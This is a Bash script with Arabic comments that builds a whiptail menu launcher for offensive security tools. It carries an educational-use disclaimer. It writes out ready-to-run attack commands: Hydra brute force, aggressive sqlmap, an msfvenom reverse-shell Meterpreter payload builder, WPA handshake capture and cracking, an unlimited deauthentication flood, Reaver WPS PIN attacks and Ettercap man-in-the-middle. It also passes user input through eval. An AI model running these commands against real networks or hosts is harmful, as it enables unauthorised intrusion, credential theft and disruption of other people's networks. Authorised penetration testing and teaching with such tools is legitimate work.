#!/bin/bash

# ==================================================
# 🧰 أداة أحمد لأدوات اختبار الاختراق (v2 - واجهة Whiptail)
# ✍️ تطوير: أحمد (تم التحديث بواسطة Manus)
# 📅 التاريخ: $(date +%Y-%m-%d)
# ⚠️ نسخة تجريبية - للاستخدام التعليمي فقط
# ==================================================

# ==================================================
# تنبيه هام وإخلاء مسؤولية
# ==================================================
# هذا السكربت "أحمد" مصمم للأغراض التعليمية والبحثية فقط في مجال الأمن السيبراني واختبار الاختراق الأخلاقي.
# يُحظر تمامًا استخدام هذه الأداة في أي أنشطة غير قانونية أو غير مصرح بها.
# المطور ("أحمد") والمساهمون لا يتحملون أي مسؤولية عن أي استخدام غير قانوني أو ضار لهذه الأداة.
# أنت وحدك المسؤول عن أفعالك وعن التأكد من امتثالك لجميع القوانين واللوائح المعمول بها قبل استخدام أي من الأدوات المدرجة.
# باستخدام هذا السكربت، فإنك توافق على هذه الشروط وتتحمل المسؤولية الكاملة عن استخدامك له.
# ==================================================

# التحقق من وجود whiptail
if ! command -v whiptail &> /dev/null; then
    echo "خطأ: أداة 'whiptail' غير مثبتة. يرجى تثبيتها أولاً."
    echo "على Debian/Ubuntu: sudo apt update && sudo apt install whiptail"
    exit 1
fi

# التحقق من صلاحيات Root (مطلوبة لبعض الأدوات مثل airmon-ng)
# if [[ $EUID -ne 0 ]]; then
#    whiptail --title "❌ خطأ صلاحيات" --msgbox "بعض الأدوات في هذا السكربت تتطلب صلاحيات root.\nيرجى تشغيل السكربت باستخدام sudo.\n\nsudo $0" 10 60
#    exit 1
# fi

# --- دوال الواجهة الرسومية (Whiptail) ---

# دالة لعرض رسالة معلومات
show_info() {
    whiptail --title "ℹ️ معلومات" --msgbox "$1" 10 70
}

# دالة لعرض رسالة خطأ
show_error() {
    whiptail --title "❌ خطأ" --msgbox "$1" 10 70
}

# دالة لعرض رسالة نجاح
show_success() {
    whiptail --title "✅ نجاح" --msgbox "$1" 10 70
}

# دالة لطلب إدخال نصي
get_input() {
    local prompt="$1"
    local title="$2"
    local default_value="$3"
    whiptail --title "$title" --inputbox "$prompt" 10 70 "$default_value" 3>&1 1>&2 2>&3
}

# دالة لعرض قائمة اختيار
show_menu() {
    local title="$1"
    local prompt="$2"
    shift 2
    local options=($@)
    whiptail --title "$title" --menu "$prompt" 20 70 12 "${options[@]}" 3>&1 1>&2 2>&3
}

# دالة لعرض مربع حوار نعم/لا
ask_yes_no() {
    local prompt="$1"
    local title="$2"
    whiptail --title "$title" --yesno "$prompt" 10 70
}

# دالة لعرض محتوى ملف نصي
show_textbox() {
    local title="$1"
    local file="$2"
    whiptail --title "$title" --textbox "$file" 25 80 --scrolltext
}

# دالة لتشغيل أمر وعرض مخرجاته (بشكل مباشر في الطرفية)
run_command() {
    local title="$1"
    local cmd="$2"
    if ask_yes_no "هل أنت متأكد أنك تريد تشغيل الأمر التالي؟\n\n$cmd" " تأكيد التشغيل"; then
        clear
        echo "=================================================="
        echo "🚀 جارٍ تشغيل: $title"
        echo "⌨️ الأمر: $cmd"
        echo "=================================================="
        # تنفيذ الأمر مباشرة في الطرفية
        eval $cmd
        echo "=================================================="
        read -p "🚦 اضغط Enter للعودة إلى القائمة..."
    else
        show_info "تم إلغاء تشغيل الأمر."
    fi
}

# --- دوال الشبكة اللاسلكية --- (تحتاج لتعديل لاستخدام whiptail)

# دالة لعرض الواجهات اللاسلكية وطلب اختيار واجهة (باستخدام whiptail)
select_wifi_interface() {
    local interfaces=$(iwconfig 2>/dev/null | grep '^[a-zA-Z]' | awk '{print $1 " \"" $1 "\""}')
    if [ -z "$interfaces" ]; then
        show_error "لم يتم العثور على واجهات لاسلكية. تأكد من توصيل وتشغيل محول لاسلكي."
        return 1
    fi

    local choice=$(whiptail --title "📡 اختيار واجهة لاسلكية" --menu "اختر الواجهة اللاسلكية:" 15 60 5 ${interfaces} 3>&1 1>&2 2>&3)
    exitstatus=$?
    if [ $exitstatus = 0 ]; then
        echo $choice
        return 0
    else
        return 1 # المستخدم ألغى
    fi
}

# دالة لتفعيل وضع المراقبة (باستخدام whiptail)
start_monitor_mode() {
    local interface=$1
    local monitor_interface="${interface}mon"

    # التحقق مما إذا كان وضع المراقبة مفعلاً بالفعل
    if iwconfig $monitor_interface &> /dev/null; then
        show_info "ℹ️ وضع المراقبة مفعل بالفعل على $monitor_interface."
        echo $monitor_interface
        return 0
    fi

    whiptail --title "⏳ تفعيل وضع المراقبة" --infobox "محاولة تفعيل وضع المراقبة على $interface...\nقد يتطلب هذا صلاحيات root." 8 60
    sleep 1

    # إيقاف العمليات التي قد تتعارض (يتطلب root)
    sudo airmon-ng check kill > /dev/null 2>&1
    sleep 1
    # بدء وضع المراقبة (يتطلب root)
    sudo airmon-ng start $interface > /dev/null 2>&1
    sleep 2 # الانتظار قليلاً للتأكد من تفعيل الواجهة

    # التحقق مرة أخرى
    if iwconfig $monitor_interface &> /dev/null; then
        show_success "✅ تم تفعيل وضع المراقبة بنجاح على $monitor_interface."
        echo $monitor_interface # إرجاع اسم واجهة المراقبة
        return 0
    else
        # محاولة اسم بديل (بعض الأنظمة تستخدم wlanXmon)
        monitor_interface="wlan${interface:4}mon"
         if iwconfig $monitor_interface &> /dev/null; then
            show_success "✅ تم تفعيل وضع المراقبة بنجاح على $monitor_interface."
            echo $monitor_interface # إرجاع اسم واجهة المراقبة
            return 0
        else
            show_error "❌ فشل تفعيل وضع المراقبة. تأكد من تشغيل السكربت بصلاحيات root (sudo) وأن المحول يدعم وضع المراقبة."
            return 1
        fi
    fi
}

# دالة لإيقاف وضع المراقبة (باستخدام whiptail)
stop_monitor_mode() {
    local monitor_interface=$1
    if [ -z "$monitor_interface" ]; then
        monitor_interface=$(get_input "أدخل اسم واجهة المراقبة لإيقافها (e.g., wlan0mon):" "إيقاف وضع المراقبة")
        if [ -z "$monitor_interface" ]; then return 1; fi # المستخدم ألغى
    fi

    if iwconfig $monitor_interface &> /dev/null; then
        whiptail --title "⏳ إيقاف وضع المراقبة" --infobox "محاولة إيقاف وضع المراقبة على $monitor_interface..." 8 60
        # إيقاف وضع المراقبة (يتطلب root)
        sudo airmon-ng stop $monitor_interface > /dev/null 2>&1
        sleep 1
        # إعادة تشغيل NetworkManager إذا كان موجوداً (يتطلب root)
        if systemctl list-units --full -all | grep -q 'NetworkManager.service'; then
            sudo systemctl start NetworkManager > /dev/null 2>&1
        fi
        show_success "✅ تم إيقاف وضع المراقبة."
    else
        show_info "ℹ️ الواجهة $monitor_interface ليست في وضع المراقبة أو غير موجودة."
    fi
}

# --- دوال القوائم الفرعية --- (سيتم تعديلها لاستخدام whiptail)

# 1. جمع المعلومات
menu_info_gathering() {
    while true; do
        local choice=$(show_menu "1. جمع المعلومات" "اختر أداة:" \
            "1" "فحص الشبكة (Nmap)" \
            "2" "جمع معلومات OSINT (theHarvester)" \
            "3" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then break; fi # رجوع إذا ألغى المستخدم

        case $choice in
            1) local target=$(get_input "أدخل IP أو نطاق الهدف لـ Nmap:" "Nmap - فحص الشبكة" "192.168.1.1")
               if [ -n "$target" ]; then run_command "Nmap Scan" "nmap -sV -A $target"; fi ;; # يتطلب nmap
            2) local domain=$(get_input "أدخل اسم النطاق لـ theHarvester:" "theHarvester - OSINT" "example.com")
               if [ -n "$domain" ]; then run_command "theHarvester Scan" "theHarvester -d $domain -l 500 -b all"; fi ;; # يتطلب theHarvester
            3) break ;; # رجوع
            *) show_error "خيار غير صالح" ;; # نظرياً لن يحدث مع whiptail
        esac
    done
}

# 2. تحليل الثغرات
menu_vuln_analysis() {
    while true; do
        local choice=$(show_menu "2. تحليل الثغرات" "اختر أداة:" \
            "1" "فحص ثغرات الويب (Nikto)" \
            "2" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then break; fi

        case $choice in
            1) local url=$(get_input "أدخل رابط الموقع (e.g., http://example.com):" "Nikto - فحص الويب" "http://")
               if [ -n "$url" ]; then run_command "Nikto Scan" "nikto -h $url"; fi ;; # يتطلب nikto
            2) break ;; # رجوع
            *) show_error "خيار غير صالح" ;; 
        esac
    done
}

# 3. تحليل تطبيقات الويب
menu_web_app_analysis() {
    while true; do
        local choice=$(show_menu "3. تحليل تطبيقات الويب" "اختر أداة:" \
            "1" "تشغيل Burp Suite" \
            "2" "فحص حقن SQL (SQLMap)" \
            "3" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then break; fi

        case $choice in
            1) show_info "سيتم محاولة تشغيل Burp Suite في الخلفية.\nقد تحتاج لتشغيله يدوياً إذا لم يعمل."
               burpsuite & ;; # يتطلب burpsuite
            2) local sql_url=$(get_input "أدخل رابط URL للفحص باستخدام SQLMap (ضعه بين علامتي اقتباس إذا احتوى على '&'):" "SQLMap - فحص SQLi" "http://testphp.vulnweb.com/listproducts.php?cat=1")
               if [ -n "$sql_url" ]; then run_command "SQLMap Scan" "sqlmap -u \"$sql_url\" --batch --level=5 --risk=3"; fi ;; # يتطلب sqlmap
            3) break ;; # رجوع
            *) show_error "خيار غير صالح" ;; 
        esac
    done
}

# 4. هجمات كلمة المرور
menu_password_attacks() {
    while true; do
        local choice=$(show_menu "4. هجمات كلمة المرور" "اختر أداة:" \
            "1" "كسر كلمات المرور (John the Ripper)" \
            "2" "تخمين كلمات المرور أونلاين (Hydra)" \
            "3" "إنشاء قوائم كلمات (Crunch)" \
            "4" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then break; fi

        case $choice in
            1) local hash_file=$(get_input "أدخل مسار ملف الهاش لـ John:" "John the Ripper" "/path/to/hashes.txt")
               if [ -n "$hash_file" ]; then run_command "John the Ripper" "john $hash_file"; fi ;; # يتطلب john
            2) local hydra_cmd=$(get_input "أدخل أمر Hydra كاملاً:\n(مثال: hydra -L users.txt -P pass.txt ftp://192.168.1.1)" "Hydra - تخمين أونلاين" "hydra -L users.txt -P pass.txt ftp://192.168.1.1")
               if [ -n "$hydra_cmd" ]; then run_command "Hydra Attack" "$hydra_cmd"; fi ;; # يتطلب hydra
            3) local min=$(get_input "أدخل الحد الأدنى لطول الكلمة:" "Crunch - إنشاء قوائم" "4")
               local max=$(get_input "أدخل الحد الأقصى لطول الكلمة:" "Crunch - إنشاء قوائم" "8")
               local chars=$(get_input "أدخل الأحرف المستخدمة (e.g., abcdef123):" "Crunch - إنشاء قوائم" "abcdefghijklmnopqrstuvwxyz0123456789")
               local outfile=$(get_input "أدخل اسم ملف الإخراج:" "Crunch - إنشاء قوائم" "wordlist.txt")
               if [ -n "$min" ] && [ -n "$max" ] && [ -n "$chars" ] && [ -n "$outfile" ]; then 
                   run_command "Crunch Wordlist Generation" "crunch $min $max $chars -o $outfile"
                   show_success "تم إنشاء القائمة في $outfile (إذا نجح الأمر)."
               fi ;; # يتطلب crunch
            4) break ;; # رجوع
            *) show_error "خيار غير صالح" ;; 
        esac
    done
}

# 5. أدوات الاستغلال
menu_exploitation_tools() {
    while true; do
        local choice=$(show_menu "5. أدوات الاستغلال" "اختر أداة:" \
            "1" "إنشاء بايلود (MSFvenom)" \
            "2" "تشغيل Metasploit Framework (msfconsole)" \
            "3" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then break; fi

        case $choice in
            1) 
                local payload=$(get_input "أدخل نوع البايلود (e.g., windows/meterpreter/reverse_tcp):" "MSFvenom - إنشاء بايلود" "windows/meterpreter/reverse_tcp")
                local lhost=$(get_input "أدخل LHOST (IP الخاص بك):" "MSFvenom - إنشاء بايلود" "192.168.1.100")
                local lport=$(get_input "أدخل LPORT (e.g., 4444):" "MSFvenom - إنشاء بايلود" "4444")
                local format=$(get_input "أدخل صيغة الملف (e.g., exe, apk, elf, py):" "MSFvenom - إنشاء بايلود" "exe")
                local outfile=$(get_input "أدخل اسم ملف الإخراج (e.g., payload.exe):" "MSFvenom - إنشاء بايلود" "payload.$format")
                if [ -n "$payload" ] && [ -n "$lhost" ] && [ -n "$lport" ] && [ -n "$format" ] && [ -n "$outfile" ]; then
                    run_command "MSFvenom Payload Generation" "msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $outfile"
                    show_success "تم إنشاء البايلود: $outfile (إذا نجح الأمر)."
                fi ;; # يتطلب msfvenom
            2) run_command "Metasploit Framework" "msfconsole" ;; # يتطلب metasploit-framework
            3) break ;; # رجوع
            *) show_error "خيار غير صالح" ;; 
        esac
    done
}

# 6. هجمات الشبكات اللاسلكية
menu_wireless_attacks() {
    local current_monitor_interface=""
    while true;
    do
        local mon_status="${current_monitor_interface:-غير مفعل}"
        local choice=$(show_menu "6. هجمات الشبكات اللاسلكية" "الواجهة في وضع المراقبة: $mon_status\nاختر أداة أو إجراء:" \
            "1" "اختيار واجهة وتفعيل وضع المراقبة (Airmon-ng)" \
            "2" "فحص الشبكات المجاورة (Airodump-ng)" \
            "3" "التقاط Handshake (Airodump-ng)" \
            "4" "هجوم Deauthentication (Aireplay-ng)" \
            "5" "كسر كلمة مرور WPA/WPA2 (Aircrack-ng)" \
            "6" "فحص شبكات WPS (Wash)" \
            "7" "هجوم WPS PIN (Reaver)" \
            "8" "إيقاف وضع المراقبة" \
            "9" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then
             # التأكد من إيقاف وضع المراقبة قبل الخروج
             if [ -n "$current_monitor_interface" ]; then
                 if ask_yes_no "هل تريد إيقاف وضع المراقبة على $current_monitor_interface قبل الرجوع؟" "تأكيد الخروج"; then
                    stop_monitor_mode $current_monitor_interface
                    current_monitor_interface=""
                 fi
             fi
             break
        fi

        case $choice in
            1) 
                local selected_interface=$(select_wifi_interface)
                if [ $? -eq 0 ] && [ -n "$selected_interface" ]; then
                    # إيقاف الواجهة الحالية إذا كانت مفعلة
                    if [ -n "$current_monitor_interface" ]; then
                        stop_monitor_mode $current_monitor_interface
                        current_monitor_interface=""
                    fi
                    local monitor_interface_name=$(start_monitor_mode $selected_interface)
                    if [ $? -eq 0 ] && [ -n "$monitor_interface_name" ]; then
                        current_monitor_interface=$monitor_interface_name
                    fi
                fi
                ;; 
            2) 
                if [ -z "$current_monitor_interface" ]; then show_error "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; continue; fi
                show_info "سيتم بدء فحص الشبكات على $current_monitor_interface.\nاضغط Ctrl+C في نافذة الأداة لإيقاف الفحص."
                # تشغيل airodump في نافذة جديدة إذا أمكن، أو مباشرة
                if command -v xterm &> /dev/null; then
                    xterm -hold -e "sudo airodump-ng $current_monitor_interface" &
                else
                    run_command "Airodump-ng Scan" "sudo airodump-ng $current_monitor_interface"
                fi
                ;; 
            3) 
                if [ -z "$current_monitor_interface" ]; then show_error "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; continue; fi
                local target_bssid=$(get_input "أدخل BSSID للشبكة المستهدفة:" "Airodump-ng - التقاط Handshake")
                local target_channel=$(get_input "أدخل قناة الشبكة المستهدفة:" "Airodump-ng - التقاط Handshake")
                local capture_file=$(get_input "أدخل اسم ملف الالتقاط (بدون امتداد):" "Airodump-ng - التقاط Handshake" "handshake_capture")
                if [ -n "$target_bssid" ] && [ -n "$target_channel" ] && [ -n "$capture_file" ]; then
                    show_info "سيتم بدء التقاط الحزم على القناة $target_channel للشبكة $target_bssid.\nاحفظ الملف باسم $capture_file.\nاضغط Ctrl+C في نافذة الأداة لإيقاف الالتقاط بعد الحصول على Handshake.\nيمكنك استخدام الخيار 4 (Deauth) لتسريع العملية."
                    if command -v xterm &> /dev/null; then
                        xterm -hold -e "sudo airodump-ng --bssid $target_bssid -c $target_channel -w $capture_file $current_monitor_interface" &
                    else
                        run_command "Airodump-ng Capture" "sudo airodump-ng --bssid $target_bssid -c $target_channel -w $capture_file $current_monitor_interface"
                    fi
                fi
                ;; 
            4) 
                if [ -z "$current_monitor_interface" ]; then show_error "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; continue; fi
                local target_bssid=$(get_input "أدخل BSSID للشبكة المستهدفة:" "Aireplay-ng - هجوم Deauth")
                local target_client_mac=$(get_input "(اختياري) أدخل MAC للعميل المستهدف (اتركه فارغاً لاستهداف الجميع):" "Aireplay-ng - هجوم Deauth")
                if [ -n "$target_bssid" ]; then
                    local attack_cmd="sudo aireplay-ng --deauth 0 -a $target_bssid"
                    if [ ! -z "$target_client_mac" ]; then
                        attack_cmd="$attack_cmd -c $target_client_mac"
                    fi
                    attack_cmd="$attack_cmd $current_monitor_interface"
                    show_info "سيتم بدء هجوم Deauthentication.\nاضغط Ctrl+C لإيقاف الهجوم."
                    run_command "Aireplay-ng Deauth" "$attack_cmd"
                fi
                ;; 
            5) 
                local capture_file_path=$(get_input "أدخل مسار ملف الالتقاط (.cap) الذي يحتوي على Handshake:" "Aircrack-ng - كسر WPA/WPA2" "handshake_capture-01.cap")
                local wordlist_path=$(get_input "أدخل مسار قائمة الكلمات (Wordlist):" "Aircrack-ng - كسر WPA/WPA2" "/usr/share/wordlists/rockyou.txt")
                if [ ! -f "$capture_file_path" ]; then show_error "❌ ملف الالتقاط '$capture_file_path' غير موجود."; continue; fi
                if [ ! -f "$wordlist_path" ]; then show_error "❌ ملف قائمة الكلمات '$wordlist_path' غير موجود."; continue; fi
                run_command "Aircrack-ng Attack" "sudo aircrack-ng $capture_file_path -w $wordlist_path"
                ;; 
            6) 
                if [ -z "$current_monitor_interface" ]; then show_error "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; continue; fi
                show_info "سيتم بدء فحص شبكات WPS المجاورة باستخدام Wash.\nاضغط Ctrl+C لإيقاف الفحص."
                run_command "Wash WPS Scan" "sudo wash -i $current_monitor_interface"
                ;; 
            7) 
                if [ -z "$current_monitor_interface" ]; then show_error "⚠️ يرجى تفعيل وضع المراقبة أولاً (الخيار 1)."; continue; fi
                local target_bssid=$(get_input "أدخل BSSID للشبكة المستهدفة (يجب أن تدعم WPS):" "Reaver - هجوم WPS PIN")
                if [ -n "$target_bssid" ]; then
                    show_info "سيتم بدء هجوم WPS PIN باستخدام Reaver على $target_bssid.\nقد يستغرق وقتاً طويلاً. اضغط Ctrl+C لإيقاف الهجوم."
                    run_command "Reaver WPS Attack" "sudo reaver -i $current_monitor_interface -b $target_bssid -vv"
                fi
                ;; 
            8) 
                if [ -n "$current_monitor_interface" ]; then
                    stop_monitor_mode $current_monitor_interface
                    current_monitor_interface=""
                else
                    show_info "ℹ️ لا يوجد وضع مراقبة مفعل حالياً."
                fi
                ;; 
            9) 
                 # التأكد من إيقاف وضع المراقبة قبل الخروج
                 if [ -n "$current_monitor_interface" ]; then
                     if ask_yes_no "هل تريد إيقاف وضع المراقبة على $current_monitor_interface قبل الرجوع؟" "تأكيد الخروج"; then
                        stop_monitor_mode $current_monitor_interface
                        current_monitor_interface=""
                     fi
                 fi
                 break ;; # الخروج من حلقة قائمة الواي فاي
            *) show_error "خيار غير صالح" ;; 
        esac
    done
}

# 7. التنصت والخداع
menu_sniffing_spoofing() {
    while true; do
        local choice=$(show_menu "7. التنصت والخداع" "اختر أداة:" \
            "1" "تشغيل Wireshark (تحليل الحزم)" \
            "2" "تشغيل Ettercap (رسومي - MITM)" \
            "3" "رجوع للقائمة الرئيسية")
        exitstatus=$?
        if [ $exitstatus != 0 ]; then break; fi

        case $choice in
            1) show_info "سيتم محاولة تشغيل Wireshark.\nقد يتطلب صلاحيات root ويعمل بشكل أفضل بواجهة رسومية."
               sudo wireshark & ;; # يتطلب wireshark
            2) show_info "سيتم محاولة تشغيل Ettercap بواجهة رسومية.\nقد يتطلب صلاحيات root."
               sudo ettercap -G & ;; # يتطلب ettercap-graphical
            3) break ;; # رجوع
            *) show_error "خيار غير صالح" ;; 
        esac
    done
}

# --- القائمة الرئيسية والحلقة الرئيسية ---

# عرض رسالة الترحيب والتنبيه
whiptail --title "👋 مرحباً بك في أداة أحمد (v2)" --msgbox "🧰 أداة أحمد لأدوات اختبار الاختراق\n\n==================================================\n   ⚠️ تنبيه هام وإخلاء مسؤولية ⚠️\n==================================================\nهذا السكربت مصمم للأغراض التعليمية والبحثية فقط.\nيُحظر تمامًا استخدامه في أي أنشطة غير قانونية.\nأنت وحدك المسؤول عن أفعالك.\n==================================================\n\nاضغط OK للمتابعة.
" 20 70

# الحلقة الرئيسية للبرنامج
while true; do
    main_choice=$(show_menu "القائمة الرئيسية" "اختر فئة الأدوات:" \
        "1" "جمع المعلومات (Information Gathering)" \
        "2" "تحليل الثغرات (Vulnerability Analysis)" \
        "3" "تحليل تطبيقات الويب (Web Application Analysis)" \
        "4" "هجمات كلمة المرور (Password Attacks)" \
        "5" "أدوات الاستغلال (Exploitation Tools)" \
        "6" "هجمات الشبكات اللاسلكية (Wireless Attacks)" \
        "7" "التنصت والخداع (Sniffing & Spoofing)" \
        "8" "خروج")
    exitstatus=$?

    if [ $exitstatus != 0 ]; then
        # المستخدم ضغط Cancel أو Esc في القائمة الرئيسية
        if ask_yes_no "هل أنت متأكد أنك تريد الخروج من الأداة؟" " تأكيد الخروج"; then
            show_info "✅ شكراً لاستخدامك أداة أحمد!\n📌 تذكر: استخدمها بمسؤولية وللأغراض التعليمية فقط."
            clear # تنظيف الشاشة عند الخروج
            exit 0
        else
            continue # العودة للقائمة الرئيسية
        fi
    fi

    case $main_choice in
        1) menu_info_gathering ;; 
        2) menu_vuln_analysis ;; 
        3) menu_web_app_analysis ;; 
        4) menu_password_attacks ;; 
        5) menu_exploitation_tools ;; 
        6) menu_wireless_attacks ;; 
        7) menu_sniffing_spoofing ;; 
        8) 
            if ask_yes_no "هل أنت متأكد أنك تريد الخروج من الأداة؟" " تأكيد الخروج"; then
                show_info "✅ شكراً لاستخدامك أداة أحمد!\n📌 تذكر: استخدمها بمسؤولية وللأغراض التعليمية فقط."
                clear # تنظيف الشاشة عند الخروج
                exit 0
            fi
            ;; 
        *) show_error "خيار غير صالح. كيف حدث هذا؟" ;; # نظرياً لن يحدث
    esac
done

